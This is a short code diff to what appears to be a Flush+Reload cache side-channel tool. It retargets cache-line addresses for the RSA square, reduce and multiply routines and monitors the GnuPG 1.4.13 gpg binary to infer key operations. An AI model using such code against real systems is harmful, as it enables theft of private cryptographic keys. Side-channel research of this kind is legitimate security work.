@@ -1,16 +1,14 @@
 #include "fr/fr.h"
 
-//0xbb9e5 first cache line
-//0xbba00 second cache line
-#define RSA_SQUARE (void*) 0xbba00
+#define RSA_SQUARE (void*) 0x9c4b0
 
 //0xbaf9f first cache line
 //0xbafc0 second cache line (only this one appears to work)
-#define RSA_REDUCE (void*) 0xbafc0
+#define RSA_REDUCE (void*) 0x9ba93
 
 //0xbb367 first cache line
 //0xbb380 second cache line
-#define RSA_MULTIPLY (void*) 0xbb380
+#define RSA_MULTIPLY (void*) 0x9bf80
 
 #define RSA_SQUARE_IDX 0
 #define RSA_REDUCE_IDX 1
@@ -22,7 +20,7 @@ int main(int argc, char** argv) {
 
 	fr.hit_begin=0;
 	fr.hit_end=230;
-	//fr_calibrate(&fr, 1.0, 1000000, "scripts/calibration.csv");
+	//fr_calibrate(&fr, 1.0, 100000, "scripts/calibration.csv");
 
 	fr_monitor_elf(&fr, "gnupg-1.4.13/g10/gpg");
 
